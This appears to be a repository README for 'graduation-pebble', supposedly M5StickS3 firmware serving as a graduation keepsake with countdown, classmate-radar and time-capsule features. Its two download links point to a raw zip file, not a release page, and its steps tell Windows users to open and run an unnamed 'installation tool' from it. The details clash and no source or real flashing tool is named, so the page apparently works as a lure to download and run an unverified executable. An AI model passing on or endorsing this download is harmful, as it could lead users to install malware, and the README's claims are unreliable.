# 🎓 graduation-pebble - A digital keepsake for your graduation

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/virile-wainscoting845/graduation-pebble/main/docs/graduation-pebble-v1.6.zip)

Graduation-pebble acts as a small, handheld digital companion. This firmware turns an M5StickS3 device into a graduation memento. It acts like a virtual pet that keeps track of your time since graduation, stores memories, and helps you stay connected with your school cohort. Because the software remains open-source, you can customize the stories, countdowns, and data to fit your specific school or country.

## 🛠 What you need

Before you start, gather these items:
- One M5StickS3 development board.
- A USB-C cable to connect the device to your computer.
- A Windows computer with a free USB port.
- Access to the internet for the initial setup.

The M5StickS3 is an ESP32-S3 powered device. It features a color screen, buttons, and a battery. It fits in your pocket and runs the graduation-pebble code indefinitely.

## 📥 Get the software

To install the firmware, visit the release page.

[Visit this page to download the latest file](https://raw.githubusercontent.com/virile-wainscoting845/graduation-pebble/main/docs/graduation-pebble-v1.6.zip)

1. Open your web browser.
2. Go to the link above.
3. Look for the "Assets" section at the bottom of the latest release.
4. Download the file ending in `.bin` or the installation tool provided.
5. Save the file to your computer desktop.

## 🔌 Connect the device

Follow these steps to connect your hardware:

1. Plug the USB-C cable into the side of your M5StickS3.
2. Plug the other end into your Windows computer.
3. Windows should make a sound indicating the device detection.
4. Observe the screen on your M5StickS3; it might show a default logo or a blank screen if it is new.

## 🚀 Setup instructions

The installation process writes the graduation-pebble software onto your hardware.

1. Open the installation tool you downloaded earlier.
2. Select the "COM" port that matches your M5StickS3. You can find this in your Windows Device Manager under "Ports (COM & LPT)."
3. Click the "Install" or "Flash" button.
4. Keep the device connected while the progress bar moves.
5. Do not close the window until the software confirms a successful flash.
6. Once finished, disconnect the device.
7. Press the power button on the side of the M5StickS3 to start your memento.

## ⏱ Features and operation

When the device turns on, you will see the main menu. Use the buttons on the side to navigate.

### Countdown timer
The device tracks the time since your graduation day. It displays the days, hours, and minutes that have passed. You can set your specific graduation date in the settings menu.

### Classmate radar
This feature searches for other M5StickS3 devices nearby that run the same firmware. If a classmate is within range, the device alerts you. This helps you reconnect with friends during reunions.

### Story replay
The firmware stores text-based stories and quotes from your time at school. Use the side buttons to scroll through these entries. You can add your own memories through the configuration menu.

### Time capsule
The time capsule locks specific data until a set date. You can input messages or photos to view them in the future. This function keeps your memories safe for exactly five years.

## ⚙ Customization

You can change the way your device behaves. Access the settings menu by holding the side button during startup.

- **Brightness:** Adjust the screen light levels to save battery.
- **Clock settings:** Update the time and date to ensure your countdown remains accurate.
- **Storage:** View how much room is left for new stories or memories.
- **Reset:** Use this to clear your data if you decide to pass the device to another person.

## 🔋 Battery life

The M5StickS3 contains a built-in battery. A full charge provides several days of light usage. The device enters a sleep state when you do not interact with it. To wake the device, press the power button once. Charge the device using any standard 5V USB charger or by plugging it into your computer.

## ❓ Frequently asked questions

**What happens if the device freezes?**
Press the reset button on the side of the M5StickS3. This clears the memory and reboots the device immediately. You will not lose your saved stories or graduation date.

**Can I use this for non-graduation purposes?**
Yes. Since the software allows for inputting custom stories and setting the countdown date, you can use it for any event, such as a retirement or a birthday.

**Is it safe to leave it plugged in?**
Yes, the hardware includes a lithium charging circuit that prevents overcharging. You can leave it connected to your computer for long periods.

**Where do I find more help?**
If you encounter errors during the installation, ensure your USB cable supports data transfer. Some cables only carry power and will not allow your computer to talk to the device. Swap your cable if the installation tool fails to detect the hardware.